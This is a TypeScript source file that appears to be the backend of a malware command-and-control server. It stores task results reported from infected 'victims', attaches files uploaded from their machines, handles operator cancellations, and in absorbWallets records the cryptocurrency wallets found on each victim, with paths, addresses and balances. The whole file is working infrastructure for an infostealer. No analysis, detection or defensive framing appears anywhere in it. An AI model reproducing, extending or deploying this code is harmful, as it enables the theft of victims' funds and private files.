import { prisma } from './db';
import { publish } from './bus';

export type ResultBody = {
  status: 'ok' | 'error' | 'cancelled';
  error?: string | null;
  result: Record<string, unknown>;
  artifacts?: Array<{ upload_request: string }>;
};

export type ApplyOutcome = 'applied' | 'duplicate' | 'conflict' | 'missing';

/**
 * Store one task result, whether it arrived over signed HTTP or the control
 * channel. Idempotent by task id and final status.
 */
export async function applyTaskResult(victimId: string, taskId: string, input: ResultBody): Promise<ApplyOutcome> {
  const task = await prisma.task.findFirst({ where: { id: taskId, victimId } });
  if (!task) return 'missing';
  const terminal = task.status === 'done' || task.status === 'error' || task.status === 'cancelled';
  if (terminal && task.result) {
    const same = task.status === (input.status === 'ok' ? 'done' : input.status === 'error' ? 'error' : 'cancelled');
    return same ? 'duplicate' : 'conflict';
  }
  await prisma.task.update({
    where: { id: taskId },
    data: {
      status: input.status === 'ok' ? 'done' : input.status === 'error' ? 'error' : 'cancelled',
      error: input.error ?? null,
      result: input.result as never,
      finishedAt: new Date(),
      leaseUntil: null
    }
  });
  // Link every upload the result names, so Files can close by task id.
  for (const artifact of input.artifacts ?? []) {
    await prisma.artifact.updateMany({
      where: { uploadId: artifact.upload_request, victimId },
      data: { taskId }
    });
  }
  if (input.status === 'ok') await absorbWallets(victimId, input.result);
  if (task.name === 'cancel') {
    // The cancel task answers last; make sure the target also closes.
    const target = typeof (task.params as { task_id?: string }).task_id === 'string'
      ? (task.params as { task_id: string }).task_id
      : '';
    if (target) {
      await prisma.task.updateMany({
        where: { id: target, victimId, status: { in: ['queued', 'running'] } },
        data: { status: 'cancelled', error: 'cancelled by operator', finishedAt: new Date(), leaseUntil: null }
      });
    }
  }
  void publish({ type: 'task.update', victimId, at: Date.now(), data: { id: taskId, status: input.status } });
  return 'applied';
}

export async function absorbWallets(victimId: string, result: Record<string, unknown>): Promise<void> {
  const wallets = Array.isArray(result.wallets) ? result.wallets : [];
  for (const item of wallets.slice(0, 500)) {
    if (!item || typeof item !== 'object') continue;
    const wallet = item as Record<string, unknown>;
    if (typeof wallet.path !== 'string' || typeof wallet.id !== 'string') continue;
    await prisma.wallet.upsert({
      where: { victimId_path: { victimId, path: wallet.path } },
      update: {
        kind: String(wallet.kind ?? 'extension'),
        targetId: wallet.id,
        state: String(wallet.state ?? 'found') as never,
        reason: wallet.reason ? String(wallet.reason) : null,
        address: wallet.address ? String(wallet.address) : null,
        balance: wallet.balance ? String(wallet.balance) : null
      },
      create: {
        victimId,
        kind: String(wallet.kind ?? 'extension'),
        targetId: wallet.id,
        path: wallet.path,
        state: String(wallet.state ?? 'found') as never,
        reason: wallet.reason ? String(wallet.reason) : null,
        address: wallet.address ? String(wallet.address) : null,
        balance: wallet.balance ? String(wallet.balance) : null
      }
    });
  }
}
